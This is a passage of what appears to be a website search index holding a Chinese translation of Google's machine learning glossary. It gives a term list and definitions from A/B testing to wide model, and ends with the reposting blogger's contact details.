002 \u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60\u7684\u53e6\u4e00\u4e2a\u4f8b\u5b50\u662f \u4e3b\u6210\u5206\u5206\u6790 (PCA) \u3002\u4f8b\u5982\uff0c\u901a\u8fc7\u5bf9\u5305\u542b\u6570\u767e\u4e07\u8d2d\u7269\u8f66\u4e2d\u7269\u54c1\u7684\u6570\u636e\u96c6\u8fdb\u884c\u4e3b\u6210\u5206\u5206\u6790\uff0c\u53ef\u80fd\u4f1a\u53d1\u73b0\u6709\u67e0\u6aac\u7684\u8d2d\u7269\u8f66\u4e2d\u5f80\u5f80\u4e5f\u6709\u6297\u9178\u836f\u3002 \u8bf7\u4e0e \u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 \u8fdb\u884c\u6bd4\u8f83\u3002 22. V # 22.1. \u9a8c\u8bc1\u96c6 (validation set) # \u6570\u636e\u96c6\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u4ece\u8bad\u7ec3\u96c6\u5206\u79bb\u800c\u6765\uff0c\u7528\u4e8e\u8c03\u6574 \u8d85\u53c2\u6570 \u3002 \u4e0e \u8bad\u7ec3\u96c6 \u548c \u6d4b\u8bd5\u96c6 \u76f8\u5bf9\u3002 23. W # 23.1. \u6743\u91cd (weight) # \u7ebf\u6027\u6a21\u578b\u4e2d \u7279\u5f81 \u7684\u7cfb\u6570\uff0c\u6216\u6df1\u5ea6\u7f51\u7edc\u4e2d\u7684\u8fb9\u3002\u8bad\u7ec3\u7ebf\u6027\u6a21\u578b\u7684\u76ee\u6807\u662f\u786e\u5b9a\u6bcf\u4e2a\u7279\u5f81\u7684\u7406\u60f3\u6743\u91cd\u3002\u5982\u679c\u6743\u91cd\u4e3a 0\uff0c\u5219\u76f8\u5e94\u7684\u7279\u5f81\u5bf9\u6a21\u578b\u6765\u8bf4\u6ca1\u6709\u4efb\u4f55\u8d21\u732e\u3002 23.2. \u5bbd\u5ea6\u6a21\u578b (wide model) # \u4e00\u79cd\u7ebf\u6027\u6a21\u578b\uff0c\u901a\u5e38\u6709\u5f88\u591a \u7a00\u758f\u8f93\u5165\u7279\u5f81 \u3002\u6211\u4eec\u4e4b\u6240\u4ee5\u79f0\u4e4b\u4e3a\"\u5bbd\u5ea6\u6a21\u578b\"\uff0c\u662f\u56e0\u4e3a\u8fd9\u662f\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684 \u795e\u7ecf\u7f51\u7edc \uff0c\u5176\u5927\u91cf\u8f93\u5165\u5747\u76f4\u63a5\u4e0e\u8f93\u51fa\u8282\u70b9\u76f8\u8fde\u3002\u4e0e\u6df1\u5ea6\u6a21\u578b\u76f8\u6bd4\uff0c\u5bbd\u5ea6\u6a21\u578b\u901a\u5e38\u66f4\u6613\u4e8e\u8c03\u8bd5\u548c\u68c0\u67e5\u3002\u867d\u7136\u5bbd\u5ea6\u6a21\u578b\u65e0\u6cd5\u901a\u8fc7 \u9690\u85cf\u5c42 \u6765\u8868\u793a\u975e\u7ebf\u6027\u5173\u7cfb\uff0c\u4f46\u53ef\u4ee5\u5229\u7528 \u7279\u5f81\u7ec4\u5408 \u3001 \u5206\u6876 \u7b49\u8f6c\u6362\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u4e3a\u975e\u7ebf\u6027\u5173\u7cfb\u5efa\u6a21\u3002 \u4e0e \u6df1\u5ea6\u6a21\u578b \u76f8\u5bf9\u3002 \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002 11 111 1 1 1asdaskhasdklja","title":"3.\u673a\u5668\u5b66\u4e60\u672f\u8bed\u8868"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#google","text":"","title":"Google \u673a\u5668\u5b66\u4e60\u672f\u8bed\u8868"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1","text":"Google\u51fa\u4e86\u4e00\u4efd\u673a\u5668\u5b66\u4e60\u672f\u8bed\u8868\uff0c\u5217\u51fa\u4e86\u4e00\u822c\u7684\u673a\u5668\u5b66\u4e60\u672f\u8bed\u548c TensorFlow \u4e13\u7528\u672f\u8bed\u7684\u5b9a\u4e49\uff0c\u5e76\u4e14\u7ffb\u8bd1\u6210\u4e86\u4e2d\u6587\uff0c\u5bf9\u7406\u89e3\u673a\u5668\u5b66\u4e60\u4e2d\u7684\u672f\u8bed\u5f88\u6709\u5e2e\u52a9\uff0c\u4e8e\u662f\u6211\u628a\u5b83\u8f6c\u8f7d\u8fc7\u6765\uff0c\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://developers.google.cn/machine-learning/glossary/?hl=zh-CN","title":"1. \u80cc\u666f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#_1","text":"Google \u673a\u5668\u5b66\u4e60\u672f\u8bed\u8868 1. \u80cc\u666f \u76ee\u5f55 2. A 2.1. A/B \u6d4b\u8bd5 (A/B testing) 2.2. \u51c6\u786e\u7387 (accuracy) 2.3. \u6fc0\u6d3b\u51fd\u6570 (activation function) 2.4. AdaGrad 2.5. ROC \u66f2\u7ebf\u4e0b\u9762\u79ef (AUC, Area under the ROC Curve) 3. B 3.1. \u53cd\u5411\u4f20\u64ad\u7b97\u6cd5 (backpropagation) 3.2. \u57fa\u51c6 (baseline) 3.3. \u6279\u6b21 (batch) 3.4. \u6279\u6b21\u5927\u5c0f (batch size) 3.5. \u504f\u5dee (bias) 3.6. \u4e8c\u5143\u5206\u7c7b (binary classification) 3.7. \u5206\u7bb1 (binning) 3.8. \u5206\u6876 (bucketing) 4. C 4.1. \u6821\u51c6\u5c42 (calibration layer) 4.2. \u5019\u9009\u91c7\u6837 (candidate sampling) 4.3. \u5206\u7c7b\u6570\u636e (categorical data) 4.4. \u5f62\u5fc3 (centroid) 4.5. \u68c0\u67e5\u70b9 (checkpoint) 4.6. \u7c7b\u522b (class) 4.7. \u5206\u7c7b\u4e0d\u5e73\u8861\u7684\u6570\u636e\u96c6 (class-imbalanced data set) 4.8. \u5206\u7c7b\u6a21\u578b (classification model) 4.9. \u5206\u7c7b\u9608\u503c (classification threshold) 4.10. \u805a\u7c7b (clustering) 4.11. \u534f\u540c\u8fc7\u6ee4 (collaborative filtering) 4.12. \u6df7\u6dc6\u77e9\u9635 (confusion matrix) 4.13. \u8fde\u7eed\u7279\u5f81 (continuous feature) 4.14. \u6536\u655b (convergence) 4.15. \u51f8\u51fd\u6570 (convex function) 4.16. \u51f8\u4f18\u5316 (convex optimization) 4.17. \u51f8\u96c6 (convex set) 4.18. \u5377\u79ef (convolution) 4.19. \u5377\u79ef\u8fc7\u6ee4\u5668 (convolutional filter) 4.20. \u5377\u79ef\u5c42 (convolutional layer) 4.21. \u5377\u79ef\u795e\u7ecf\u7f51\u7edc (convolutional neural network) 4.22. \u5377\u79ef\u8fd0\u7b97 (convolutional operation) 4.23. \u6210\u672c (cost) 4.24. \u4ea4\u53c9\u71b5 (cross-entropy) 4.25. \u81ea\u5b9a\u4e49 Estimator (custom Estimator) 5. D 5.1. \u6570\u636e\u5206\u6790 (data analysis) 5.2. DataFrame 5.3. \u6570\u636e\u96c6 (data set) 5.4. Dataset API (tf.data) 5.5. \u51b3\u7b56\u8fb9\u754c (decision boundary) 5.6. \u5bc6\u96c6\u5c42 (dense layer) 5.7. \u6df1\u5ea6\u6a21\u578b (deep model) 5.8. \u5bc6\u96c6\u7279\u5f81 (dense feature) 5.9. \u8bbe\u5907 (device) 5.10. \u79bb\u6563\u7279\u5f81 (discrete feature) 5.11. \u4e22\u5f03\u6b63\u5219\u5316 (dropout regularization) 5.12. \u52a8\u6001\u6a21\u578b (dynamic model) 6. E 6.1. \u65e9\u505c\u6cd5 (early stopping) 6.2. \u5d4c\u5957 (embeddings) 6.3. \u7ecf\u9a8c\u98ce\u9669\u6700\u5c0f\u5316 (ERM, empirical risk minimization) 6.4. \u96c6\u6210\u5b66\u4e60 (ensemble) 6.5. \u5468\u671f (epoch) 6.6. Estimator 6.7. \u6837\u672c (example) 7. F 7.1. \u5047\u8d1f\u4f8b (FN, false negative) 7.2. \u5047\u6b63\u4f8b (FP, false positive) 7.3. \u5047\u6b63\u4f8b\u7387\uff08false positive rate, \u7b80\u79f0 FP \u7387\uff09 7.4. \u7279\u5f81 (feature) 7.5. \u7279\u5f81\u5217 (tf.feature_column) 7.6. \u7279\u5f81\u7ec4\u5408 (feature cross) 7.7. \u7279\u5f81\u5de5\u7a0b (feature engineering) 7.8. \u7279\u5f81\u96c6 (feature set) 7.9. \u7279\u5f81\u89c4\u8303 (feature spec) 7.10. \u5c11\u91cf\u6837\u672c\u5b66\u4e60 (few-shot learning) 7.11. \u5b8c\u6574 softmax (full softmax) 7.12. \u5168\u8fde\u63a5\u5c42 (fully connected layer) 8. G 8.1. \u6cdb\u5316 (generalization) 8.2. \u5e7f\u4e49\u7ebf\u6027\u6a21\u578b (generalized linear model) 8.3. \u68af\u5ea6 (gradient) 8.4. \u68af\u5ea6\u88c1\u526a (gradient clipping) 8.5. \u68af\u5ea6\u4e0b\u964d\u6cd5 (gradient descent) 8.6. \u56fe (graph) 9. H 9.1. \u542f\u53d1\u6cd5 (heuristic) 9.2. \u9690\u85cf\u5c42 (hidden layer) 9.3. \u5408\u9875\u635f\u5931\u51fd\u6570 (hinge loss) 9.4. \u7ef4\u6301\u6570\u636e (holdout data) 9.5. \u8d85\u53c2\u6570 (hyperparameter) 9.6. \u8d85\u5e73\u9762 (hyperplane) 10. I 10.1. \u72ec\u7acb\u540c\u7b49\u5206\u5e03 (i.i.d, independently and identically distributed) 10.2. \u63a8\u65ad (inference) 10.3. \u8f93\u5165\u51fd\u6570 (input function) 10.4. \u8f93\u5165\u5c42 (input layer) 10.5. \u5b9e\u4f8b (instance) 10.6. \u53ef\u89e3\u91ca\u6027 (interpretability) 10.7. \u8bc4\u5206\u8005\u95f4\u4e00\u81f4\u6027\u4fe1\u5ea6 (inter-rater agreement) 10.8. \u8fed\u4ee3 (iteration) 11. K 11.1. k-means 11.2. k-median 11.3. Keras 11.4. \u6838\u652f\u6301\u5411\u91cf\u673a (KSVM, Kernel Support Vector Machines) 12. L 12.1. L_1 \u635f\u5931\u51fd\u6570 (L_1 loss) 12.2. L_1 \u6b63\u5219\u5316 (L_1 regularization) 12.3. L_2 \u635f\u5931\u51fd\u6570 (L_2 loss) 12.4. L_2 \u6b63\u5219\u5316 (L_2 regularization) 12.5. \u6807\u7b7e (label) 12.6. \u6709\u6807\u7b7e\u6837\u672c (labeled example) 12.7. lambda 12.8. \u5c42 (layer) 12.9. Layers API (tf.layers) 12.10. \u5b66\u4e60\u901f\u7387 (learning rate) 12.11. \u6700\u5c0f\u4e8c\u4e58\u56de\u5f52 (least squares regression) 12.12. \u7ebf\u6027\u56de\u5f52 (linear regression) 12.13. \u903b\u8f91\u56de\u5f52 (logistic regression) 12.14. \u5bf9\u6570 (logits) 12.15. \u5bf9\u6570\u635f\u5931\u51fd\u6570 (Log Loss) 12.16. \u5bf9\u6570\u51e0\u7387 (log-odds) 12.17. \u635f\u5931 (Loss) 13. M 13.1. \u673a\u5668\u5b66\u4e60 (machine learning) 13.2. \u5747\u65b9\u8bef\u5dee (MSE, Mean Squared Error) 13.3. \u6307\u6807 (metric) 13.4. Metrics API (tf.metrics) 13.5. \u5c0f\u6279\u6b21 (mini-batch) 13.6. \u5c0f\u6279\u6b21\u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6cd5 (SGD, mini-batch stochastic gradient descent) 13.7. ML 13.8. \u6a21\u578b (model) 13.9. \u6a21\u578b\u51fd\u6570 (model function) 13.10. \u6a21\u578b\u8bad\u7ec3 (model training) 13.11. \u52a8\u91cf (Momentum) 13.12. \u591a\u7c7b\u522b\u5206\u7c7b (multi-class classification) 13.13. \u591a\u9879\u5206\u7c7b (multinomial classification) 14. N 14.1. NaN \u9677\u9631 (NaN trap) 14.2. \u8d1f\u7c7b\u522b (negative class) 14.3. \u795e\u7ecf\u7f51\u7edc (neural network) 14.4. \u795e\u7ecf\u5143 (neuron) 14.5. \u8282\u70b9 (node) 14.6. \u6807\u51c6\u5316 (normalization) 14.7. \u6570\u503c\u6570\u636e (numerical data) 14.8. Numpy 15. O 15.1. \u76ee\u6807 (objective) 15.2. \u79bb\u7ebf\u63a8\u65ad (offline inference) 15.3. \u72ec\u70ed\u7f16\u7801 (one-hot encoding) 15.4. \u5355\u6837\u672c\u5b66\u4e60\uff08one-shot learning\uff0c\u901a\u5e38\u7528\u4e8e\u5bf9\u8c61\u5206\u7c7b\uff09 15.5. \u4e00\u5bf9\u591a (one-vs.-all) 15.6. \u5728\u7ebf\u63a8\u65ad (online inference) 15.7. \u64cd\u4f5c (op, Operation) 15.8. \u4f18\u5316\u5668 (optimizer) 15.9. \u79bb\u7fa4\u503c (outlier) 15.10. \u8f93\u51fa\u5c42 (output layer) 15.11. \u8fc7\u62df\u5408 (overfitting) 16. P 16.1. Pandas 16.2. \u53c2\u6570 (parameter) 16.3. \u53c2\u6570\u670d\u52a1\u5668 (PS, Parameter Server) 16.4. \u53c2\u6570\u66f4\u65b0 (parameter update) 16.5. \u504f\u5bfc\u6570 (partial derivative) 16.6. \u5212\u5206\u7b56\u7565 (partitioning strategy) 16.7. \u6027\u80fd (performance) 16.8. \u56f0\u60d1\u5ea6 (perplexity) 16.9. \u6d41\u6c34\u7ebf (pipeline) 16.10. \u6c60\u5316 (pooling) 16.11. \u6b63\u7c7b\u522b (positive class) 16.12. \u7cbe\u786e\u7387 (precision) 16.13. \u9884\u6d4b (prediction) 16.14. \u9884\u6d4b\u504f\u5dee (prediction bias) 16.15. \u9884\u521b\u5efa\u7684 Estimator (pre-made Estimator) 16.16. \u9884\u8bad\u7ec3\u6a21\u578b (pre-trained model) 16.17. \u5148\u9a8c\u4fe1\u5ff5 (prior belief) 17. Q 17.1. \u961f\u5217 (queue) 18. R 18.1. \u7b49\u7ea7 (rank) 18.2. \u8bc4\u5206\u8005 (rater) 18.3. \u53ec\u56de\u7387 (recall) 18.4. \u4fee\u6b63\u7ebf\u6027\u5355\u5143 (ReLU, Rectified Linear Unit) 18.5. \u56de\u5f52\u6a21\u578b (regression model) 18.6. \u6b63\u5219\u5316 (regularization) 18.7. \u6b63\u5219\u5316\u7387 (regularization rate) 18.8. \u8868\u793a\u6cd5 (representation) 18.9. \u53d7\u8bd5\u8005\u5de5\u4f5c\u7279\u5f81\u66f2\u7ebf\uff08receiver operating characteristic\uff0c\u7b80\u79f0 ROC \u66f2\u7ebf\uff09 18.10. \u6839\u76ee\u5f55 (root directory) 18.11. \u5747\u65b9\u6839\u8bef\u5dee (RMSE, Root Mean Squared Error) 18.12. \u65cb\u8f6c\u4e0d\u53d8\u6027 (rotational invariance) 19. S 19.1. SavedModel 19.2. Saver 19.3. \u7f29\u653e (scaling) 19.4. scikit-learn 19.5. \u534a\u76d1\u7763\u5f0f\u5b66\u4e60 (semi-supervised learning) 19.6. \u5e8f\u5217\u6a21\u578b (sequence model) 19.7. \u4f1a\u8bdd (tf.session) 19.8. S \u578b\u51fd\u6570 (sigmoid function) 19.9. \u5927\u5c0f\u4e0d\u53d8\u6027 (size invariance) 19.10. softmax 19.11. \u7a00\u758f\u7279\u5f81 (sparse feature) 19.12. \u7a00\u758f\u8868\u793a\u6cd5 (sparse representation) 19.13. \u7a00\u758f\u6027 (sparsity) 19.14. \u7a7a\u95f4\u6c60\u5316 (spatial pooling) 19.15. \u5e73\u65b9\u5408\u9875\u635f\u5931\u51fd\u6570 (squared hinge loss) 19.16. \u5e73\u65b9\u635f\u5931\u51fd\u6570 (squared loss) 19.17. \u9759\u6001\u6a21\u578b (static model) 19.18. \u5e73\u7a33\u6027 (stationarity) 19.19. \u6b65 (step) 19.20. \u6b65\u957f (step size) 19.21. \u968f\u673a\u68af\u5ea6\u4e0b\u964d\u6cd5 (SGD, stochastic gradient descent) 19.22. \u7ed3\u6784\u98ce\u9669\u6700\u5c0f\u5316 (SRM, structural risk minimization) 19.23. \u6b65\u957f (stride) 19.24. \u4e0b\u91c7\u6837 (subsampling) 19.25. \u603b\u7ed3 (summary) 19.26. \u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 (supervised machine learning) 19.27. \u5408\u6210\u7279\u5f81 (synthetic feature) 20. T 20.1. \u76ee\u6807 (target) 20.2. \u65f6\u6001\u6570\u636e (temporal data) 20.3. \u5f20\u91cf (Tensor) 20.4. \u5f20\u91cf\u5904\u7406\u5355\u5143 (TPU, Tensor Processing Unit) 20.5. \u5f20\u91cf\u7b49\u7ea7 (Tensor rank) 20.6. \u5f20\u91cf\u5f62\u72b6 (Tensor shape) 20.7. \u5f20\u91cf\u5927\u5c0f (Tensor size) 20.8. TensorBoard 20.9. TensorFlow 20.10. TensorFlow Playground 20.11. TensorFlow Serving 20.12. \u6d4b\u8bd5\u96c6 (test set) 20.13. tf.Example 20.14. \u65f6\u95f4\u5e8f\u5217\u5206\u6790 (time series analysis) 20.15. \u8bad\u7ec3 (training) 20.16. \u8bad\u7ec3\u96c6 (training set) 20.17. \u8fc1\u79fb\u5b66\u4e60 (transfer learning) 20.18. \u5e73\u79fb\u4e0d\u53d8\u6027 (translational invariance) 20.19. \u8d1f\u4f8b (TN, true negative) 20.20. \u6b63\u4f8b (TP, true positive) 20.21. \u6b63\u4f8b\u7387\uff08true positive rate, \u7b80\u79f0 TP \u7387\uff09 21. U 21.1. \u65e0\u6807\u7b7e\u6837\u672c (unlabeled example) 21.2. \u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 (unsupervised machine learning) 22. V 22.1. \u9a8c\u8bc1\u96c6 (validation set) 23. W 23.1. \u6743\u91cd (weight) 23.2. \u5bbd\u5ea6\u6a21\u578b (wide model)","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2-a","text":"","title":"2. A"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#21-ab-ab-testing","text":"\u4e00\u79cd\u7edf\u8ba1\u65b9\u6cd5\uff0c\u7528\u4e8e\u5c06\u4e24\u79cd\u6216\u591a\u79cd\u6280\u672f\u8fdb\u884c\u6bd4\u8f83\uff0c\u901a\u5e38\u662f\u5c06\u5f53\u524d\u91c7\u7528\u7684\u6280\u672f\u4e0e\u65b0\u6280\u672f\u8fdb\u884c\u6bd4\u8f83\u3002A/B \u6d4b\u8bd5\u4e0d\u4ec5\u65e8\u5728\u786e\u5b9a\u54ea\u79cd\u6280\u672f\u7684\u6548\u679c\u66f4\u597d\uff0c\u800c\u4e14\u8fd8\u6709\u52a9\u4e8e\u4e86\u89e3\u76f8\u5e94\u5dee\u5f02\u662f\u5426\u5177\u6709\u663e\u8457\u7684\u7edf\u8ba1\u610f\u4e49\u3002A/B \u6d4b\u8bd5\u901a\u5e38\u662f\u91c7\u7528\u4e00\u79cd\u8861\u91cf\u65b9\u5f0f\u5bf9\u4e24\u79cd\u6280\u672f\u8fdb\u884c\u6bd4\u8f83\uff0c\u4f46\u4e5f\u9002\u7528\u4e8e\u4efb\u610f\u6709\u9650\u6570\u91cf\u7684\u6280\u672f\u548c\u8861\u91cf\u65b9\u5f0f\u3002","title":"2.1. A/B \u6d4b\u8bd5 (A/B testing)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#22-accuracy","text":"\u5206\u7c7b\u6a21\u578b \u7684\u6b63\u786e\u9884\u6d4b\u6240\u5360\u7684\u6bd4\u4f8b\u3002\u5728 \u591a\u7c7b\u522b\u5206\u7c7b \u4e2d\uff0c\u51c6\u786e\u7387\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a \\text{\u51c6\u786e\u7387} = \\frac{\\text{\u6b63\u786e\u7684\u9884\u6d4b\u6570}}{\\text{\u6837\u672c\u603b\u6570}} \u5728 \u4e8c\u5143\u5206\u7c7b \u4e2d\uff0c\u51c6\u786e\u7387\u7684\u5b9a\u4e49\u5982\u4e0b\uff1a \\text{\u51c6\u786e\u7387} = \\frac{\\text{\u6b63\u4f8b\u6570 + \u8d1f\u4f8b\u6570}}{\\text{\u6837\u672c\u603b\u6570}} \u8bf7\u53c2\u9605 \u6b63\u4f8b \u548c \u8d1f\u4f8b \u3002","title":"2.2. \u51c6\u786e\u7387 (accuracy)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#23-activation-function","text":"\u4e00\u79cd\u51fd\u6570\uff08\u4f8b\u5982 ReLU \u6216 S \u578b\u51fd\u6570 \uff09\uff0c\u7528\u4e8e\u5bf9\u4e0a\u4e00\u5c42\u7684\u6240\u6709\u8f93\u5165\u6c42\u52a0\u6743\u548c\uff0c\u7136\u540e\u751f\u6210\u4e00\u4e2a\u8f93\u51fa\u503c\uff08\u901a\u5e38\u4e3a\u975e\u7ebf\u6027\u503c\uff09\uff0c\u5e76\u5c06\u5176\u4f20\u9012\u7ed9\u4e0b\u4e00\u5c42\u3002","title":"2.3. \u6fc0\u6d3b\u51fd\u6570 (activation function)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#24-adagrad","text":"\u4e00\u79cd\u5148\u8fdb\u7684\u68af\u5ea6\u4e0b\u964d\u6cd5\uff0c\u7528\u4e8e\u91cd\u65b0\u8c03\u6574\u6bcf\u4e2a\u53c2\u6570\u7684\u68af\u5ea6\uff0c\u4ee5\u4fbf\u6709\u6548\u5730\u4e3a\u6bcf\u4e2a\u53c2\u6570\u6307\u5b9a\u72ec\u7acb\u7684 \u5b66\u4e60\u901f\u7387 \u3002\u5982\u9700\u67e5\u770b\u5b8c\u6574\u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u9605 \u8fd9\u7bc7\u8bba\u6587 \u3002","title":"2.4. AdaGrad"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#25-roc-auc-area-under-the-roc-curve","text":"\u4e00\u79cd\u4f1a\u8003\u8651\u6240\u6709\u53ef\u80fd \u5206\u7c7b\u9608\u503c \u7684\u8bc4\u4f30\u6307\u6807\u3002 ROC \u66f2\u7ebf \u4e0b\u9762\u79ef\u662f\uff0c\u5bf9\u4e8e\u968f\u673a\u9009\u62e9\u7684\u6b63\u7c7b\u522b\u6837\u672c\u786e\u5b9e\u4e3a\u6b63\u7c7b\u522b\uff0c\u4ee5\u53ca\u968f\u673a\u9009\u62e9\u7684\u8d1f\u7c7b\u522b\u6837\u672c\u4e3a\u6b63\u7c7b\u522b\uff0c\u5206\u7c7b\u5668\u66f4\u786e\u4fe1\u524d\u8005\u7684\u6982\u7387\u3002","title":"2.5. ROC \u66f2\u7ebf\u4e0b\u9762\u79ef (AUC, Area under the ROC Curve)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#3-b","text":"","title":"3. B"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#31-backpropagation","text":"\u5728 \u795e\u7ecf\u7f51\u7edc \u4e0a\u6267\u884c \u68af\u5ea6\u4e0b\u964d\u6cd5 \u7684\u4e3b\u8981\u7b97\u6cd5\u3002\u8be5\u7b97\u6cd5\u4f1a\u5148\u6309\u524d\u5411\u4f20\u64ad\u65b9\u5f0f\u8ba1\u7b97\uff08\u5e76\u7f13\u5b58\uff09\u6bcf\u4e2a\u8282\u70b9\u7684\u8f93\u51fa\u503c\uff0c\u7136\u540e\u518d\u6309\u53cd\u5411\u4f20\u64ad\u904d\u5386\u56fe\u7684\u65b9\u5f0f\u8ba1\u7b97\u635f\u5931\u51fd\u6570\u503c\u76f8\u5bf9\u4e8e\u6bcf\u4e2a\u53c2\u6570\u7684 \u504f\u5bfc\u6570 \u3002","title":"3.1. \u53cd\u5411\u4f20\u64ad\u7b97\u6cd5 (backpropagation)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#32-baseline","text":"\u4e00\u79cd\u7b80\u5355\u7684 \u6a21\u578b \u6216\u542f\u53d1\u6cd5\uff0c\u7528\u4f5c\u6bd4\u8f83\u6a21\u578b\u6548\u679c\u65f6\u7684\u53c2\u8003\u70b9\u3002\u57fa\u51c6\u6709\u52a9\u4e8e\u6a21\u578b\u5f00\u53d1\u8005\u9488\u5bf9\u7279\u5b9a\u95ee\u9898\u91cf\u5316\u6700\u4f4e\u9884\u671f\u6548\u679c\u3002","title":"3.2. \u57fa\u51c6 (baseline)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#33-batch","text":"\u6a21\u578b\u8bad\u7ec3 \u7684\u4e00\u6b21 \u8fed\u4ee3 \uff08\u5373\u4e00\u6b21 \u68af\u5ea6 \u66f4\u65b0\uff09\u4e2d\u4f7f\u7528\u7684\u6837\u672c\u96c6\u3002 \u53e6\u8bf7\u53c2\u9605 \u6279\u6b21\u5927\u5c0f \u3002","title":"3.3. \u6279\u6b21 (batch)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#34-batch-size","text":"\u4e00\u4e2a \u6279\u6b21 \u4e2d\u7684\u6837\u672c\u6570\u3002\u4f8b\u5982\uff0c SGD \u7684\u6279\u6b21\u5927\u5c0f\u4e3a 1\uff0c\u800c \u5c0f\u6279\u6b21 \u7684\u5927\u5c0f\u901a\u5e38\u4ecb\u4e8e 10 \u5230 1000 